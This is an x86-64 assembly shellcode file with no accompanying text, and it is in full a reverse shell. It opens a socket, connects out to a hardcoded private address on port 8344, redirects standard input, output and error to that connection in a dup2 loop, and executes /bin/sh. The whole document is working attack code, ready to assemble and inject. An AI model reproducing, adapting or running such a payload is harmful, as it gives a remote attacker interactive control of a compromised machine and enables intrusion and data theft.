global _start

section .text

_start:

Create_Socket:

        push   0x29
        pop    rax
        cdq
        push   0x2
        pop    rdi
        push   0x1
        pop    rsi
        syscall

Socket_Struct:

        xchg   rdi,rax
        mov    rcx,0x80f4a8c098200002   ; IP:192.168.244.128 Port:8344

        push   rcx
        mov    rsi,rsp
        push   0x10
        pop    rdx

Socket_Connect:

        push   0x2a
        pop    rax
        syscall

        push   0x3
        pop    rsi

dup2:

        dec    rsi
        push   0x21
        pop    rax
        syscall
        jne    dup2

Execve:

        push   0x3b
        pop    rax
        cdq
        mov    rbx,0x68732f6e69622f
        push   rbx
        mov    rdi,rsp
        push   rdx
        push   rdi
        mov    rsi,rsp
        syscall
